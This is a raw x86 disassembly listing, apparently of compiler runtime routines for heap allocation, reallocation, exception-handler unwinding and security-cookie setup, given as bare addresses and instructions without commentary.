  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
